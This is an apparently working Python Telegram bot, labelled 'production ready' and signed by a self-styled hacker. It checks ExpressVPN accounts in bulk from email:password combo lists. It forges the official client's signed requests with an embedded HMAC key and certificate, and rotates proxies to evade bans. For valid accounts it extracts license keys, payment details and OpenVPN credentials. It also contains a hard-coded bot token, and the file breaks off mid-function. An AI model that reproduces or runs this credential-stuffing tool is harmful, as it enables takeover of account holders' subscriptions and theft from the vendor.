#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ExpressVPN Telegram Bot - Production Ready
# Author: CAT Shadow Hacker
# Token & Admin ID: Configured

import asyncio
import logging
import os
import re
import sys
import time
import json
import base64
import gzip
import random
import string
import hmac as _hmaclib
import hashlib
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from collections import deque, defaultdict
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple, Set
from contextlib import asynccontextmanager
import concurrent.futures

# Telegram
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    CallbackQuery, Chat, User, Message
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, JobQueue
)
from telegram.constants import ParseMode
from telegram.error import TelegramError, NetworkError, TimedOut

# Third-party
import requests
import urllib3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7 as CryptoPKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, core, x509 as asn1_x509
import aiohttp
from aiohttp_socks import ProxyConnector

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── CONFIGURATION ──────────────────────────────────────────────────────────
BOT_TOKEN = "8136827302:AAHpATxlggGEUJ_Pw1DVB07eesKaWTlvOn8"
ADMIN_IDS = [7305141058]
ALLOWED_USERS = []  # Empty = allow everyone

# Performance settings
MAX_THREADS = 15
RATE_LIMIT_PER_MINUTE = 10
MAX_QUEUE_SIZE = 100
PROXY_TIMEOUT = 10
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3
LOG_LEVEL = "INFO"

# ── Logging ────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=getattr(logging, LOG_LEVEL)
)
logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────
BASE_URL = "https://www.expressapisv2.net/apis/v2"
LICENSE_URL = "https://www.expressvpn.com/api/v2/subscriptions"
CLIENT_VER = "11.5.2"
OS_NAME = "ios"
OS_VER = "14.4"
UA = f"xvclient/v21.21.0 ({OS_NAME}; {OS_VER}) ui/{CLIENT_VER}"
SIG_VER = "2"
SIG_ID = "91c776e"
HMAC_KEY = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"

CERT_B64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMw"
    "EQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcN"
    "MTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29t"
    "ZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0B"
    "AQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0"
    "u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88Po"
    "cBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxe"
    "DjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86Ef"
    "nKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAd"
    "BgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/"
    "v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxX"
    "ARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iX"
    "JpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8k"
    "rF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp"
    "+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNz"
    "OuxZ4BXLe7YA=="
)

# ── Proxy Parser ───────────────────────────────────────────────────────────
def parse_proxy_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line or line.startswith(('#', '//', ';')):
        return None
    if line.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
        return line
    if '@' in line and ':' in line.split('@')[0]:
        return f"http://{line}"
    parts = line.split(':')
    if len(parts) == 2:
        host, port = parts
        if port.isdigit():
            return f"http://{host}:{port}"
    if len(parts) == 4:
        user, passwd, host, port = parts
        if port.isdigit():
            return f"http://{user}:{passwd}@{host}:{port}"
    return None

def parse_proxy_file(content: str) -> List[str]:
    proxies = []
    for line in content.splitlines():
        parsed = parse_proxy_line(line)
        if parsed:
            proxies.append(parsed)
    return proxies

# ── Crypto Helpers ─────────────────────────────────────────────────────────
def aes_dec(data: bytes, key: bytes, iv: bytes) -> bytes:
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    raw = dec.update(data) + dec.finalize()
    unpadder = CryptoPKCS7(128).unpadder()
    return unpadder.update(raw) + unpadder.finalize()

def aes_enc(data: bytes, key: bytes, iv: bytes) -> bytes:
    padder = CryptoPKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return enc.update(padded) + enc.finalize()

def hmac_sign(data: bytes) -> str:
    return base64.b64encode(
        _hmaclib.new(HMAC_KEY.encode(), data, hashlib.sha1).digest()
    ).decode()

def sig(raw: str) -> str:
    return f"{SIG_VER} {hmac_sign(raw.encode())} {SIG_ID}"

def bsig(b: bytes) -> str:
    return f"{SIG_VER} {hmac_sign(b)} {SIG_ID}"

def cms_encrypt(data: bytes) -> bytes:
    cert_der = base64.b64decode(CERT_B64)
    aes_key = os.urandom(16)
    iv = os.urandom(16)
    enc_body = aes_enc(data, aes_key, iv)
    ccert = crypto_x509.load_der_x509_certificate(cert_der)
    enc_key = ccert.public_key().encrypt(aes_key, asym_padding.PKCS1v15())
    acert = asn1_x509.Certificate.load(cert_der)
    recip = cms.RecipientInfo({
        "ktri": cms.KeyTransRecipientInfo({
            "version": cms.CMSVersion(0),
            "rid": cms.RecipientIdentifier({
                "issuer_and_serial_number": cms.IssuerAndSerialNumber({
                    "issuer": acert["tbs_certificate"]["issuer"],
                    "serial_number": acert["tbs_certificate"]["serial_number"],
                })
            }),
            "key_encryption_algorithm": cms.KeyEncryptionAlgorithm({
                "algorithm": "1.2.840.113549.1.1.1",
                "parameters": core.Null(),
            }),
            "encrypted_key": enc_key,
        })
    })
    env = cms.EnvelopedData({
        "version": cms.CMSVersion(0),
        "recipient_infos": cms.RecipientInfos([recip]),
        "encrypted_content_info": cms.EncryptedContentInfo({
            "content_type": "1.2.840.113549.1.7.1",
            "content_encryption_algorithm": cms.EncryptionAlgorithm({
                "algorithm": "2.16.840.1.101.3.4.1.2",
                "parameters": core.OctetString(iv),
            }),
            "encrypted_content": enc_body,
        }),
    })
    return cms.ContentInfo({"content_type": "1.2.840.113549.1.7.3", "content": env}).dump()

# ── Core Checker ──────────────────────────────────────────────────────────
def check_account(email: str, password: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    result = {"status": "ERROR", "email": email, "password": password, "error": None}
    try:
        iv_b = os.urandom(16)
        key_b = os.urandom(16)
        iid = "".join(random.choices(string.ascii_lowercase + string.digits, k=64))

        body_json = json.dumps({
            "email": email,
            "iv": base64.b64encode(iv_b).decode(),
            "key": base64.b64encode(key_b).decode(),
            "password": password
        })
        gzipped = gzip.compress(body_json.encode(), compresslevel=9)
        enc = cms_encrypt(gzipped)
        qs = f"client_version={CLIENT_VER}&installation_id={iid}&os_name={OS_NAME}&os_version={OS_VER}"
        enc_sig = bsig(enc)
        hdr_sig = sig(f"POST /apis/v2/credentials?{qs}")

        proxies = {"http": proxy, "https": proxy} if proxy else None
        session = requests.Session()
        resp = session.post(
            f"{BASE_URL}/credentials?{qs}",
            data=enc,
            headers={
                "User-Agent": UA,
                "Content-Type": "application/octet-stream",
                "X-Body-Compression": "gzip",
                "X-Signature": hdr_sig,
                "X-Body-Signature": enc_sig,
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate"
            },
            proxies=proxies,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )

        if resp.status_code in (400, 401):
            result["status"] = "BAD"
            session.close()
            return result
        if resp.status_code == 500:
            result["status"] = "BAN"
            session.close()
            return result
        if resp.status_code != 200:
            result["status"] = "ERROR"
            result["error"] = f"HTTP {resp.status_code}"
            session.close()
            return result

        try:
            body = aes_dec(resp.content, key_b, iv_b).decode("utf-8", errors="ignore")
        except Exception as e:
            result["status"] = "ERROR"
            result["error"] = f"Decrypt: {str(e)[:50]}"
            session.close()
            return result

        token_match = re.search(r'"access_token":"([^"]+)"', body)
        if not token_match:
            result["status"] = "BAD"
            session.close()
            return result
        token = token_match.group(1)

        ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', body)
        ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', body)
        ovpn = f"{ovpn_user.group(1)}:{ovpn_pass.group(1)}" if ovpn_user and ovpn_pass else ""

        sub_qs = (
            f"access_token={token}&client_version={CLIENT_VER}"
            f"&installation_id={iid}&os_name={OS_NAME}&os_version={OS_VER}"
            f"&reason=activation_with_email"
        )
        sub_sig = sig(f"GET /apis/v2/subscription?{sub_qs}")
        batch_str = (
            f'[{{"headers":{{"Accept-Language":"en","X-Signature":"{sub_sig}"}},'
            f'"method":"GET","url":"/apis/v2/subscription?{sub_qs}"}}]'
        )
        batch_qs = qs
        b_sig = sig(f"POST /apis/v2/batch?{batch_qs}")
        bb_sig = bsig(batch_str.encode())

        br = session.post(
            f"{BASE_URL}/batch?{batch_qs}",
            data=batch_str,
            headers={
                "User-Agent": UA,
                "X-Body-Compression": "gzip",
                "X-Signature": b_sig,
                "X-Body-Signature": bb_sig,
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate"
            },
            proxies=proxies,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        bt = br.text or ""

        if "subscription" not in bt:
            result.update({"status": "EXPIRED", "ovpn": ovpn, "plan": "Unknown", "expire": ""})
            session.close()
            return result

        ue = bt.encode().decode("unicode_escape", errors="replace")

        def extract(pattern: str, text: str = ue) -> str:
            m = re.search(pattern, text)
            return m.group(1) if m else ""

        plan_match = re.search(r'billing_cycle":(\d+)', ue)
        plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"

        exp_match = re.search(r'expiration_time":(\d+)', ue)
        exp_ts = int(exp_match.group(1)) if exp_match else 0
        now = time.time()
        days = max(0, round((exp_ts - now) / 86400)) if exp_ts > now else 0
        expire = datetime.fromtimestamp(exp_ts).strftime("%Y-%m-%d") if exp_ts else ""

        payment = extract(r'payment_method":"([^"]+)"')
        sub_status_match = re.search(r'"(?:subscription_)?status"\s*:\s*"([^"]+)"', ue, re.I)
        sub_status = sub_status_match.group(1).upper() if sub_status_match else "ACTIVE"
        auto_match = re.search(r'auto_bill":([^,}]+)', ue)
        auto_bill = (auto_match.group(1).strip().lower() == "true") if auto_match else False

        if (exp_ts and exp_ts < now) or (sub_status == "REVOKED" and not (exp_ts and exp_ts > now)):
            result.update({"status": "EXPIRED", "plan": plan, "expire": expire, "ovpn": ovpn})
            session.close()
            return result

        license_key = ""
        try:
            lr = session.get(
                LICENSE_URL,
                headers={
                    "Authorization": f"Bearer {token}",
                    "x-tenant": "xvpn",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                },
                proxies=proxies,
                timeout=10,
                verify=False
            )
            codes = re.findall(r'longCode":"([^"]+)"', lr.text)
            license_key = codes[-1] if codes else ""
        except Exception:
            pass

        session.close()
        result.update({
            "status": "HIT",
            "plan": plan,
            "expire": expire,
            "days": days,
            "payment": payment,
            "auto_bill": auto_bill,
            "license": license_key,
            "ovpn": ovpn
        })
        return result

    except requests.exceptions.Timeout:
        result["status"] = "ERROR"
        result["error"] = "Timeout"
        return result
    except requests.exceptions.ProxyError:
        result["status"] = "ERROR"
        result["error"] = "Proxy error"
        return result
    except Exception as e:
        result["status"] = "ERROR"
        result["error"] = str(e)[:60]
        return result

# ── User State Manager ─────────────────────────────────────────────────────
class UserState:
    def __init__(self):
        self.current_job: Optional[Dict[str, Any]] = None
        self.job_queue: List[Dict[str, Any]] = []
        self.proxies: List[str] = []
        self.last_command_time: datetime = datetime.now()
        self.command_count: int = 0
        self.results: List[Dict[str, Any]] = []
        self.is_processing: bool = False
        self.progress: Dict[str, Any] = {
            "total": 0,
            "checked": 0,
            "hits": 0,
            "expired": 0,
            "bad": 0,
            "errors": 0
        }

class BotState:
    def __init__(self):
        self.users: Dict[int, UserState] = defaultdict(UserState)
        self.total_checks: int = 0
        self.total_hits: int = 0
        self.is_maintenance: bool = False
        self.start_time: datetime = datetime.now()
        self.error_log: List[str] = []

    def get_user(self, user_id: int) -> UserState:
        return self.users[user_id]

bot_state = BotState()

# ── Rate Limiter ───────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self, max_requests_per_minute: int = 10):
        self.max_requests = max_requests_per_minute
        self.user_requests: Dict[int, List[float]] = defaultdict(list)

    def is_allowed(self, user_id: int) -> bool:
        now = time.time()
        cutoff = now - 60
        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if t > cutoff]
        if len(self.user_requests[user_id]) >= self.max_requests:
            return False
        self.user_requests[user_id].append(now)
        return True

rate_limiter = RateLimiter(RATE_LIMIT_PER_MINUTE)

# ── Helper Functions ──────────────────────────────────────────────────────
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def is_allowed(user_id: int) -> bool:
    if not ALLOWED_USERS:
        return True
    return user_id in ALLOWED_USERS or is_admin(user_id)

def format_result(result: Dict[str, Any]) -> str:
    status = result.get("status", "UNKNOWN")
    email = result.get("email", "")
    password = result.get("password", "")

    if status == "HIT":
        plan = result.get("plan", "Unknown")
        expire = result.get("expire", "N/A")
        days = result.get("days", 0)
        license_key = result.get("license", "")
        ovpn = result.get("ovpn", "")
        payment = result.get("payment", "")
        auto_bill = "✓" if result.get("auto_bill") else "✗"

        lines = [
            f"✅ <b>HIT</b>",
            f"📧 <code>{email}</code>",
            f"🔑 <code>{password}</code>",
            f"📅 Plan: <b>{plan}</b>",
            f"⏳ Expires: {expire} ({days} days)",
            f"💳 Payment: {payment or 'N/A'}",
            f"🔄 Auto-bill: {auto_bill}",
        ]
        if license_key:
            lines.append(f"🔐 License: <code>{license_key}</code>")
        if ovpn:
            lines.append(f"🖧 OVPN: <code>{ovpn}</code>")
        return "\n".join(lines)

    elif status == "EXPIRED":
        plan = result.get("plan", "Unknown")
        expire = result.get("expire", "N/A")
        ovpn = result.get("ovpn", "")
        lines = [
            f"⚠️ <b>EXPIRED</b>",
            f"📧 <code>{email}</code>",
            f"🔑 <code>{password}</code>",
            f"📅 Plan: {plan}",
            f"⏳ Expired: {expire}",
        ]
        if ovpn:
            lines.append(f"🖧 OVPN: <code>{ovpn}</code>")
        return "\n".join(lines)

    elif status == "BAD":
        return f"❌ <b>BAD</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>"

    elif status == "BAN":
        return f"🚫 <b>BANNED</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n<i>IP or account temporarily blocked</i>"

    else:
        error = result.get("error", "Unknown error")
        return f"⚠️ <b>ERROR</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n📝 {error}"

def create_main_menu(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🚀 Start Check", callback_data="start_check"),
            InlineKeyboardButton("📊 Stats", callback_data="stats")
        ],
        [
            InlineKeyboardButton("📁 Manage Proxies", callback_data="manage_proxies"),
            InlineKeyboardButton("📖 Help", callback_data="help")
        ],
    ]
    if is_admin(user_id):
        keyboard.append([
            InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")
        ])
    return InlineKeyboardMarkup(keyboard)

def create_proxy_menu() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("📥 Import Proxies", callback_data="import_proxies"),
            InlineKeyboardButton("🧹 Clear Proxies", callback_data="clear_proxies")
        ],
        [
            InlineKeyboardButton("📋 Show Proxies", callback_data="show_proxies"),
            InlineKeyboardButton("🔙 Back", callback_data="main_menu")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def create_admin_menu() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
            InlineKeyboardButton("👥 Users", callback_data="admin_users")
        ],
        [
            InlineKeyboardButton("🔧 Toggle Maintenance", callback_data="toggle_maintenance"),
            InlineKeyboardButton("📋 Error Log", callback_data="error_log")
        ],
        [
            InlineKeyboardButton("🔄 Reset Stats", callback_data="reset_stats"),
            InlineKeyboardButton("🔙 Back", callback_data="main_menu")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

# ── Job Queue for Async Processing ──────────────────────────────────────
class CheckJob:
    def __init__(self, user_id: int, combos: List[str], proxies: List[str], message: Message):
        self.user_id = user_id
        self.combos = combos
        self.proxies = proxies
        self.message = message
        self.results = []
        self.progress = {"total": len(combos), "checked": 0, "hits": 0, "expired": 0, "bad": 0, "errors": 0}
        self.is_running = True
        self.start_time = datetime.now()

async def process_job(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
    user_state = bot_state.get_user(job.user_id)
    user_state.is_processing = True

    proxy_pool = job.proxies if job.proxies else [None]
    proxy_idx = 0

    executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
    loop = asyncio.get_event_loop()

    results = []
    semaphore = asyncio.Semaphore(MAX_THREADS)

    async def check_one(combo: str, proxy: Optional[str]):
        nonlocal proxy_idx
        try:
            email, password = combo.split(":", 1)
            email = email.strip()
            password = password.strip()
        except ValueError:
            job.progress["checked"] += 1
            job.progress["bad"] += 1
            return

        for attempt in range(MAX_RETRIES):
            current_proxy = proxy_pool[proxy_idx % len(proxy_pool)] if proxy_pool else None
            proxy_idx += 1

            try:
                async with semaphore:
                    result = await loop.run_in_executor(
                        executor,
                        check_account,
                        email,
                        password,
                        current_proxy
                    )
            except Exception as e:
                if attempt == MAX_RETRIES - 1:
                    job.progress["checked"] += 1
                    job.progress["errors"] += 1
                    return
                await asyncio.sleep(1)
                continue

            status = result.get("status", "ERROR")

            if status == "BAN":
                proxy_idx += 1
                await asyncio.sleep(2)
                continue

            if status in ("ERROR",) and attempt < MAX_RETRIES - 1:
                await asyncio.sleep(0.5)
                continue

            job.progress["checked"] += 1
            if status == "HIT":
                job.progress["hits"] += 1
            elif status == "EXPIRED":
                job.progress["expired"] += 1
            elif status == "BAD":
                job.progress["bad"] += 1
            else:
                job.progress["errors"] += 1

            results.append(result)
            break

        if len(results) % 5 == 0:
            await update_progress_message(job, context)

    tasks = []
    for combo in job.combos:
        if not job.is_running:
            break
        proxy = proxy_pool[proxy_idx % len(proxy_pool)] if proxy_pool else None
        proxy_idx += 1
        tasks.append(check_one(combo, proxy))

    await asyncio.gather(*tasks, return_exceptions=True)

    job.is_running = False
    user_state.is_processing = False
    user_state.results = results
    bot_state.total_checks += job.progress["checked"]
    bot_state.total_hits += job.progress["hits"]

    executor.shutdown(wait=False)
    await send_final_results(job, context)

async def update_progress_message(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
    try:
        progress = job.progress
        total = progress["total"]
        checked = progress["checked"]
        hits = progress["hits"]
        expired = progress["expired"]
        bad = progress["bad"]
        errors = progress["errors"]

        pct = (checked / total * 100) if total > 0 else 0
        bar_len = 20
        filled = int(pct / 100 * bar_len)
        bar = "█" * filled + "░" * (bar_len - filled)

        elapsed = (datetime.now() - job.start_time).total_seconds()
        cpm = (checked / (elapsed / 60)) if elapsed > 0 else 0

        text = f"""<b>📡 Checking ExpressVPN Accounts</b>

Progress: [{bar}] {pct:.1f}%
<b>{checked:,}</b> / {total:,} checked

✅ <b>Hits:</b> {hits}
⚠️ <b>Expired:</b> {expired}
❌ <b>Bad:</b> {bad}
🔴 <b>Errors:</b> {errors}

⚡ Speed: {cpm:.1f} CPM
⏱ Elapsed: {int(elapsed // 60)}m {int(elapsed % 60)}s

<i>Results will be sent when complete...</i>
"""
        await job.message.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to update progress: {e}")

async def send_final_results(job: CheckJob, context: ContextTypes.DEFAULT_TYPE):
    user_id = job.user_id
    results = job.results
    progress = job.progress

    hits = [r for r in results if r.get("status") == "HIT"]
    expired = [r for r in results if r.get("status") == "EXPIRED"]

    summary = f"""<b>✅ Check Complete!</b>

📊 <b>Results Summary</b>
─────────────────
✅ <b>Hits:</b> {len(hits)}
⚠️ <b>Expired:</b> {len(expired)}
❌ <b>Bad:</b> {progress['bad']}
🔴 <b>Errors:</b> {progress['errors']}
─────────────────
<b>Total:</b> {progress['total']:,} checked

⏱ Time: {(datetime.now() - job.start_time).total_seconds():.1f}s
"""

    await context.bot.send_message(
        chat_id=user_id,
        text=summary,
        parse_mode=ParseMode.HTML
    )

    if hits:
        hit_text = "<b>✅ HITS</b>\n" + "─" * 20 + "\n"
        for hit in hits[:50]:
            hit_text += format_result(hit) + "\n" + "─" * 20 + "\n"

        if len(hits) > 50:
            hit_text += f"\n<i>... and {len(hits) - 50} more hits</i>"

        await context.bot.send_message(
            chat_id=user_id,
            text=hit_text,
            parse_mode=ParseMode.HTML
        )

    if expired:
        exp_text = "<b>⚠️ EXPIRED</b>\n" + "─" * 20 + "\n"
        for exp in expired[:50]:
            exp_text += format_result(exp) + "\n" + "─" * 20 + "\n"

        if len(expired) > 50:
            exp_text += f"\n<i>... and {len(expired) - 50} more expired</i>"

        await context.bot.send_message(
            chat_id=user_id,
            text=exp_text,
            parse_mode=ParseMode.HTML
        )

    if len(results) > 100:
        try:
            file_path = f"/tmp/results_{user_id}_{int(time.time())}.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                for r in results:
                    status = r.get("status", "UNKNOWN")
                    email = r.get("email", "")
                    password = r.get("password", "")
                    if status == "HIT":
                        plan = r.get("plan", "")
                        expire = r.get("expire", "")
                        license_key = r.get("license", "")
                        f.write(f"HIT|{email}|{password}|{plan}|{expire}|{license_key}\n")
                    elif status == "EXPIRED":
                        f.write(f"EXPIRED|{email}|{password}\n")
                    elif status == "BAD":
                        f.write(f"BAD|{email}|{password}\n")
                    else:
                        f.write(f"ERROR|{email}|{password}\n")

            await context.bot.send_document(
                chat_id=user_id,
                document=open(file_path, "rb"),
                filename=f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                caption="📁 Full results file"
            )
            os.unlink(file_path)
        except Exception as e:
            logger.error(f"Failed to send results file: {e}")

    await context.bot.send_message(
        chat_id=user_id,
        text="🔙 <b>Return to main menu</b>",
        reply_markup=create_main_menu(user_id),
        parse_mode=ParseMode.HTML
    )

    user_state = bot_state.get_user(user_id)
    user_state.is_processing = False
    user_state.current_job = None

# ── Command Handlers ──────────────────────────────────────────────────────

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if not is_allowed(user_id):
        await update.message.reply_text(
            "🚫 <b>Access Denied</b>\n\nYou are not authorized to use this bot.",
            parse_mode=ParseMode.HTML
        )
        return

    if bot_state.is_maintenance:
        await update.message.reply_text(
            "🔧 <b>Maintenance Mode</b>\n\nThe bot is currently undergoing maintenance.",
            parse_mode=ParseMode.HTML
        )
        return

    welcome_text = f"""<b>🔐 ExpressVPN Account Checker</b>

Welcome, {user.first_name}! 🎯

I can check ExpressVPN accounts for validity. Send me a file with accounts in <code>email:password</code> format, or send the combos as text.

<b>📋 Features</b>
• Check accounts via ExpressVPN API
• Proxy support (HTTP/HTTPS/SOCKS4/SOCKS5)
• Real-time progress updates
• Detailed results with subscription info

<b>📖 Commands</b>
/start - Show this menu
/help - Get help
/stats - View your statistics

<b>💡 Quick Start</b>
1. Send a .txt file with <code>email:password</code> combos
2. Or paste combos directly
3. Use inline buttons to manage proxies
"""
    await update.message.reply_text(
        welcome_text,
        reply_markup=create_main_menu(user_id),
        parse_mode=ParseMode.HTML
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("Access denied.")
        return

    help_text = """<b>📖 Help & Commands</b>

<b>📁 Accounts Format</b>
Send a .txt file with one account per line:
<code>email:password</code>

<b>🌐 Proxy Support</b>
Proxies can be in these formats:
• <code>host:port</code>
• <code>user:pass@host:port</code>
• <code>http://host:port</code>
• <code>socks5://host:port</code>

<b>📊 Results</b>
For each account, I show:
• Status: HIT / EXPIRED / BAD / ERROR
• Plan and expiration date
• License key (if available)

<b>⚡ Tips</b>
• Use good proxies to avoid bans
• Recommended: 10-50 accounts per file

Use the buttons below to navigate! 👇
"""

    await update.message.reply_text(
        help_text,
        reply_markup=create_main_menu(user_id),
        parse_mode=ParseMode.HTML
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not is_allowed(user_id):
        await update.message.reply_text("Access denied.")
        return

    user_state = bot_state.get_user(user_id)
    stats = user_state.progress

    text = f"""<b>📊 Your Statistics</b>

Total checked: {stats.get('total', 0)}
✅ Hits: {stats.get('hits', 0)}
⚠️ Expired: {stats.get('expired', 0)}
❌ Bad: {stats.get('bad', 0)}
🔴 Errors: {stats.get('errors', 0)}

Proxy count: {len(user_state.proxies)}
Last activity: {user_state.last_command_time.strftime('%Y-%m-%d %H:%M')}
"""

    if is_admin(user_id):
        text += f"""
<b>📊 Global Stats</b>
Total checks: {bot_state.total_checks:,}
Total hits: {bot_state.total_hits:,}
Active users: {len(bot_state.users)}
Uptime: {datetime.now() - bot_state.start_time}
Maintenance: {'🔧 ACTIVE' if bot_state.is_maintenance else '✅ Off'}
"""

    await update.message.reply_text(
        text,
        reply_markup=create_main_menu(user_id),
        parse_mode=ParseMode.HTML
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id

    if not is_allowed(user_id):
        await query.edit_message_text("🚫 Access denied.")
        return

    if bot_state.is_maintenance and not is_admin(user_id):
        await query.edit_message_text(
            "🔧 The bot is currently in maintenance mode.",
            reply_markup=create_main_menu(user_id)
        )
        return

    data = query.data
    user_state = bot_state.get_user(user_id)

    if data == "main_menu":
        await query.edit_message_text(
            "🔙 <b>Main Menu</b>",
            reply_markup=create_main_menu(user_id),
            parse_mode=ParseMode.HTML
        )

    elif data == "start_check":
        if user_state.is_processing:
            await query.edit_message_text(
                "⏳ <b>Already processing!</b>\n\nPlease wait for your current check to complete.",
                reply_markup=create_main_menu(user_id),
                parse_mode=ParseMode.HTML
            )
            return

        await query.edit_message_text(
            f"""<b>🚀 Start Checking</b>

📤 <b>Send me a file or paste combos</b>

<b>Format:</b> <code>email:password</code>
<b>Proxies:</b> {len(user_state.proxies)} loaded

<i>Send a .txt file or paste the combos directly.</i>

🌐 <b>Proxy Status</b>
{'✅ Proxies loaded' if user_state.proxies else '⚠️ No proxies loaded (direct connection)'}
            """,
            reply_markup=create_main_menu(user_id),
            parse_mode=ParseMode.HTML
        )
        context.user_data['expecting_combos'] = True

    elif data == "stats":
        await stats_command(update, context)

    elif data == "manage_proxies":
        await query.edit_message_text(
            f"""<b>🌐 Proxy Management</b>

<b>Loaded:</b> {len(user_state.proxies)} proxies
<b>Format:</b> HTTP, HTTPS, SOCKS4, SOCKS5

<b>How to import:</b>
• Send a .txt file with proxies
• One proxy per line
• Supports all common formats

<b>Examples:</b>
<code>192.168.1.1:8080
user:pass@proxy.com:3128
socks5://proxy.com:1080</code>
            """,
            reply_markup=create_proxy_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "import_proxies":
        await query.edit_message_text(
            "📥 <b>Import Proxies</b>\n\nSend me a <b>.txt</b> file with your proxies.",
            reply_markup=create_proxy_menu(),
            parse_mode=ParseMode.HTML
        )
        context.user_data['expecting_proxies'] = True

    elif data == "clear_proxies":
        count = len(user_state.proxies)
        user_state.proxies = []
        await query.edit_message_text(
            f"🧹 <b>Proxies Cleared</b>\n\nRemoved {count} proxies.",
            reply_markup=create_proxy_menu(),
            parse_mode=ParseMode.HTML
        )

    elif data == "show_proxies":
        if not user_state.proxies:
            await query.edit_message_text(
                "📋 <b>No proxies loaded</b>",
                reply_markup=create_proxy_menu(),
                parse_mode=ParseMode.HTML
            )
            return

        proxy_text = "<b>📋 Loaded Proxies</b>\n\n"
        for i, p in enumerate(user_state.proxies[:20], 1):
            proxy_text += f"{i}. <code>{p}</code>\n"

        if len(user_state.proxies) > 20:
            proxy_text += f"\n<i>... and {len(user_state.proxies) - 20} more</i>"

        proxy_text += f"\n\n<b>Total:</b> {len(user_state.proxies)} proxies"

        await query.edit_message_text(
            proxy_text,
